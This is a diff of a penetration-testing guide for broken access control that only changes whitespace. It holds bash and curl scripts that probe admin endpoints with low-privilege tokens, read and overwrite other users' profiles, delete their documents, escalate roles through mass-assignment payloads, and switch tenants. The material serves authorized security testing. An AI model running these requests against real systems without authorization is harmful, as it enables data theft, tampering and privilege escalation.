@@ -1,10 +1,10 @@
 ---
 name: testing-for-broken-access-control
 description: Systematically tests web applications and APIs for broken access control
-  (OWASP A01:2021), including privilege escalation, missing function-level checks, insecure
-  direct object references, and multi-tenant data leakage, using Burp Suite with the
-  Authorize extension. Use during authorized penetration tests or RBAC/multi-tenant
-  authorization audits.
+ (OWASP A01:2021), including privilege escalation, missing function-level checks, insecure
+ direct object references, and multi-tenant data leakage, using Burp Suite with the
+ Authorize extension. Use during authorized penetration tests or RBAC/multi-tenant
+ authorization audits.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -60,25 +60,25 @@ Document every endpoint and the expected access level for each role.
 # Target > Site Map > Right-click > Copy URLs in this host
 
 # Build a matrix of endpoints vs roles:
-# | Endpoint              | Admin | Manager | User | Guest |
+# | Endpoint | Admin | Manager | User | Guest |
 # |-----------------------|-------|---------|------|-------|
-# | GET /admin/dashboard  | Allow | Deny    | Deny | Deny  |
-# | GET /api/users        | Allow | Allow   | Deny | Deny  |
-# | PUT /api/users/{id}   | Allow | Deny    | Own  | Deny  |
-# | DELETE /api/posts/{id} | Allow | Allow   | Own  | Deny  |
+# | GET /admin/dashboard | Allow | Deny | Deny | Deny |
+# | GET /api/users | Allow | Allow | Deny | Deny |
+# | PUT /api/users/{id} | Allow | Deny | Own | Deny |
+# | DELETE /api/posts/{id} | Allow | Allow | Own | Deny |
 
 # Discover hidden endpoints
 ffuf -u "https://target.example.com/FUZZ" \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -mc 200,301,302,403 -fc 404 \
-  -H "Authorization: Bearer $USER_TOKEN" \
-  -o endpoints.json -of json
+ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+ -mc 200,301,302,403 -fc 404 \
+ -H "Authorization: Bearer $USER_TOKEN" \
+ -o endpoints.json -of json
 
 # API endpoint discovery
 ffuf -u "https://target.example.com/api/v1/FUZZ" \
-  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-  -mc 200,201,204,301,302,401,403,405 -fc 404 \
-  -H "Authorization: Bearer $USER_TOKEN"
+ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+ -mc 200,201,204,301,302,401,403,405 -fc 404 \
+ -H "Authorization: Bearer $USER_TOKEN"
 ```
 
 ### Step 2: Configure Automated Access Control Testing
@@ -92,24 +92,24 @@ Set up Burp Authorize extension for parallel role-based testing.
 # Configuration for three-tier testing:
 # 1. Browse the application as Admin (capture all requests)
 # 2. In Authorize tab:
-#    a. Add Regular User's session token in "Replace cookies/headers"
-#    b. Optionally add a second row for Unauthenticated (no auth header)
+# a. Add Regular User's session token in "Replace cookies/headers"
+# b. Optionally add a second row for Unauthenticated (no auth header)
 
 # Example header replacement setup:
 # Row 1 (Low-privilege user):
-#   Cookie: session=low_priv_user_session
-#   Authorization: Bearer low_priv_token
+# Cookie: session=low_priv_user_session
+# Authorization: Bearer low_priv_token
 #
 # Row 2 (Unauthenticated):
-#   [Empty - removes all auth headers]
+# [Empty - removes all auth headers]
 
 # Enable interception in Authorize:
 # - Check "Intercept requests from Proxy"
 # - Check "Intercept requests from Repeater"
 
 # Authorize shows results as:
-# Green  = Properly restricted (different response for different user)
-# Red    = POTENTIALLY VULNERABLE (same response regardless of role)
+# Green = Properly restricted (different response for different user)
+# Red = POTENTIALLY VULNERABLE (same response regardless of role)
 # Orange = Uncertain (needs manual verification)
 ```
 
@@ -125,47 +125,47 @@ USER_TOKEN="Bearer user_jwt_here"
 
 # Test admin endpoints with user token
 ADMIN_ENDPOINTS=(
-  "GET /admin/dashboard"
-  "GET /admin/users"
-  "POST /admin/users/create"
-  "PUT /admin/settings"
-  "DELETE /admin/users/5"
-  "GET /admin/logs"
-  "GET /admin/reports/export"
-  "POST /admin/backup"
+ "GET /admin/dashboard"
+ "GET /admin/users"
+ "POST /admin/users/create"
+ "PUT /admin/settings"
+ "DELETE /admin/users/5"
+ "GET /admin/logs"
+ "GET /admin/reports/export"
+ "POST /admin/backup"
 )
 
 for entry in "${ADMIN_ENDPOINTS[@]}"; do
-  method=$(echo "$entry" | cut -d' ' -f1)
-  endpoint=$(echo "$entry" | cut -d' ' -f2)
-  echo -n "$method $endpoint (as user): "
-  status=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X "$method" \
-    -H "Authorization: $USER_TOKEN" \
-    -H "Content-Type: application/json" \
-    "https://target.example.com$endpoint")
-  if [ "$status" == "200" ] || [ "$status" == "201" ]; then
-    echo "VULNERABLE ($status)"
-  else
-    echo "OK ($status)"
-  fi
+ method=$(echo "$entry" | cut -d' ' -f1)
+ endpoint=$(echo "$entry" | cut -d' ' -f2)
+ echo -n "$method $endpoint (as user): "
+ status=$(curl -s -o /dev/null -w "%{http_code}" \
+ -X "$method" \
+ -H "Authorization: $USER_TOKEN" \
+ -H "Content-Type: application/json" \
+ "https://target.example.com$endpoint")
+ if [ "$status" == "200" ] || [ "$status" == "201" ]; then
+ echo "VULNERABLE ($status)"
+ else
+ echo "OK ($status)"
+ fi
 done
 
 # Test with method override headers
 curl -s -o /dev/null -w "%{http_code}" \
-  -X POST \
-  -H "Authorization: $USER_TOKEN" \
-  -H "X-HTTP-Method-Override: DELETE" \
-  "https://target.example.com/admin/users/5"
+ -X POST \
+ -H "Authorization: $USER_TOKEN" \
+ -H "X-HTTP-Method-Override: DELETE" \
+ "https://target.example.com/admin/users/5"
 
 # Test with different HTTP methods
 for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
-  echo -n "$method /admin/users: "
-  curl -s -o /dev/null -w "%{http_code}" \
-    -X "$method" \
-    -H "Authorization: $USER_TOKEN" \
-    "https://target.example.com/admin/users"
-  echo
+ echo -n "$method /admin/users: "
+ curl -s -o /dev/null -w "%{http_code}" \
+ -X "$method" \
+ -H "Authorization: $USER_TOKEN" \
+ "https://target.example.com/admin/users"
+ echo
 done
 ```
 
@@ -178,39 +178,39 @@ Verify that users cannot access resources belonging to other users at the same p
 USER_A_TOKEN="Bearer user_a_jwt"
 
 RESOURCES=(
-  "/api/users/102/profile"
-  "/api/users/102/orders"
-  "/api/users/102/messages"
-  "/api/users/102/documents"
-  "/api/users/102/settings"
-  "/api/users/102/payment-methods"
+ "/api/users/102/profile"
+ "/api/users/102/orders"
+ "/api/users/102/messages"
+ "/api/users/102/documents"
+ "/api/users/102/settings"
+ "/api/users/102/payment-methods"
 )
 
 for resource in "${RESOURCES[@]}"; do
-  echo -n "GET $resource: "
-  response=$(curl -s -w "\n%{http_code}" \
-    -H "Authorization: $USER_A_TOKEN" \
-    "https://target.example.com$resource")
-  status=$(echo "$response" | tail -1)
-  body_len=$(echo "$response" | head -n -1 | wc -c)
-  if [ "$status" == "200" ] && [ "$body_len" -gt 50 ]; then
-    echo "VULNERABLE ($status, $body_len bytes)"
-  else
-    echo "OK ($status)"
-  fi
+ echo -n "GET $resource: "
+ response=$(curl -s -w "\n%{http_code}" \
+ -H "Authorization: $USER_A_TOKEN" \
+ "https://target.example.com$resource")
+ status=$(echo "$response" | tail -1)
+ body_len=$(echo "$response" | head -n -1 | wc -c)
+ if [ "$status" == "200" ] && [ "$body_len" -gt 50 ]; then
+ echo "VULNERABLE ($status, $body_len bytes)"
+ else
+ echo "OK ($status)"
+ fi
 done
 
 # Test write operations across users
 curl -s -X PUT \
-  -H "Authorization: $USER_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"name":"Hacked","email":"hacked@evil.com"}' \
-  "https://target.example.com/api/users/102/profile" -w "%{http_code}"
+ -H "Authorization: $USER_A_TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"name":"Hacked","email":"hacked@evil.com"}' \
+ "https://target.example.com/api/users/102/profile" -w "%{http_code}"
 
 # Test delete operations
 curl -s -X DELETE \
-  -H "Authorization: $USER_A_TOKEN" \
-  "https://target.example.com/api/users/102/documents/1" -w "%{http_code}"
+ -H "Authorization: $USER_A_TOKEN" \
+ "https://target.example.com/api/users/102/documents/1" -w "%{http_code}"
 ```
 
 ### Step 5: Test Function-Level Access Control
@@ -220,24 +220,24 @@ Verify that specific functions enforce authorization properly.
 ```bash
 # Test unauthenticated access to protected endpoints
 PROTECTED_ENDPOINTS=(
-  "/api/user/profile"
-  "/api/transactions"
-  "/api/settings"
-  "/admin/dashboard"
-  "/api/export/users"
+ "/api/user/profile"
+ "/api/transactions"
+ "/api/settings"
+ "/admin/dashboard"
+ "/api/export/users"
 )
 
 for endpoint in "${PROTECTED_ENDPOINTS[@]}"; do
-  echo -n "No auth: GET $endpoint: "
-  curl -s -o /dev/null -w "%{http_code}" \
-    "https://target.example.com$endpoint"
-  echo
+ echo -n "No auth: GET $endpoint: "
+ curl -s -o /dev/null -w "%{http_code}" \
+ "https://target.example.com$endpoint"
+ echo
 done
 
 # Test with expired/invalid tokens
 curl -s -o /dev/null -w "%{http_code}" \
-  -H "Authorization: Bearer invalid_token_here" \
-  "https://target.example.com/api/user/profile"
+ -H "Authorization: Bearer invalid_token_here" \
+ "https://target.example.com/api/user/profile"
 
 # Test role manipulation in JWT claims
 # If JWT contains role claim, try modifying it
@@ -245,16 +245,16 @@ curl -s -o /dev/null -w "%{http_code}" \
 
 # Test parameter-based role escalation
 curl -s -X PUT \
-  -H "Authorization: $USER_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"role":"admin","is_admin":true,"permissions":["admin","superuser"]}' \
-  "https://target.example.com/api/users/101/profile"
+ -H "Authorization: $USER_TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"role":"admin","is_admin":true,"permissions":["admin","superuser"]}' \
+ "https://target.example.com/api/users/101/profile"
 
 # Test registration with elevated role
 curl -s -X POST \
-  -H "Content-Type: application/json" \
-  -d '{"email":"new@test.com","password":"Test123!","role":"admin"}' \
-  "https://target.example.com/api/auth/register"
+ -H "Content-Type: application/json" \
+ -d '{"email":"new@test.com","password":"Test123!","role":"admin"}' \
+ "https://target.example.com/api/auth/register"
 ```
 
 ### Step 6: Test Multi-Tenant Isolation
@@ -267,28 +267,28 @@ TENANT_A_TOKEN="Bearer tenant_a_user_jwt"
 
 # Direct tenant resource access
 curl -s -H "Authorization: $TENANT_A_TOKEN" \
-  "https://target.example.com/api/organizations/tenant-b-id/users" | jq .
+ "https://target.example.com/api/organizations/tenant-b-id/users" | jq .
 
 curl -s -H "Authorization: $TENANT_A_TOKEN" \
-  "https://target.example.com/api/organizations/tenant-b-id/settings" | jq .
+ "https://target.example.com/api/organizations/tenant-b-id/settings" | jq .
 
 # Test tenant switching via header
 curl -s -H "Authorization: $TENANT_A_TOKEN" \
-  -H "X-Tenant-ID: tenant-b-id" \
-  "https://target.example.com/api/users" | jq .
+ -H "X-Tenant-ID: tenant-b-id" \
+ "https://target.example.com/api/users" | jq .
 
 # Test tenant ID in request body
 curl -s -X POST \
-  -H "Authorization: $TENANT_A_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"tenant_id":"tenant-b-id","query":"SELECT * FROM users"}' \
-  "https://target.example.com/api/reports/custom"
+ -H "Authorization: $TENANT_A_TOKEN" \
+ -H "Content-Type: application/json" \
+ -d '{"tenant_id":"tenant-b-id","query":"SELECT * FROM users"}' \
+ "https://target.example.com/api/reports/custom"
 
 # Enumerate tenant IDs
 ffuf -u "https://target.example.com/api/organizations/FUZZ" \
-  -w <(seq 1 100) \
-  -H "Authorization: $TENANT_A_TOKEN" \
-  -mc 200 -t 10 -rate 20
+ -w <(seq 1 100) \
+ -H "Authorization: $TENANT_A_TOKEN" \
+ -mc 200 -t 10 -rate 20
 ```
 
 ## Key Concepts
